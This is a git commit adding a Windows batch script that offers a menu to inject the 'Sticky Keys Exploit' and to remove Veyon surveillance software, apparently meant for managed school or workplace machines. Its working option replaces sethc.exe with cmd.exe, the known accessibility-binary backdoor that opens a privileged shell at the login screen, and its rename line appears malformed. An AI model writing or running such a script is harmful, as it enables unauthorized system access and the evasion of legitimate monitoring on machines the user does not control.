f313d3b0509fa2f58933d5a1d809138136489933
Swiss professional sh!ta$$ <76264518+kevadesu@users.noreply.github.com>
2024-02-28 19:31:52 +0100

    Add files via upload

---
+++ CheckAWNT8.bat
@@ -0,0 +1,43 @@
+@echo off
+echo "----CheckAWNT8-------------------------------"
+echo "Welcome to CheckAWNT8! (Windows 10/11)"
+echo "This will allow you to run the Sticky Keys Exploit"
+echo "1: Inject jailbreak"
+echo "2: Remove Veyon Surveillance (doesn't work yet)"
+echo "3: Restart"
+echo "4: Exit"
+echo "5: Inject jailbreak (Utilman method) (doesn't work yet)"
+set /p choice=Enter an option:
+
+if "%choice%"=="1" goto 1
+if "%choice%"=="2" goto 2
+if "%choice%"=="3" goto 3
+if "%choice%"=="4" goto 4
+if "%choice%"=="5" goto 5
+
+echo Error: Invalid input
+goto End
+
+:1
+ren C:\Windows\System32\sethc.exe C:\Windows\System32\etc.exe.bak
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+echo The Sticky Keys Exploit has been injected successfully!
+goto End
+
+:2
+echo This option doesn't work yet!    
+goto End
+
+:3
+shutdown -r -t 0
+goto End
+
+:4
+goto End
+
+:5
+echo Error: Invalid input
+goto End
+
+:End
+pause
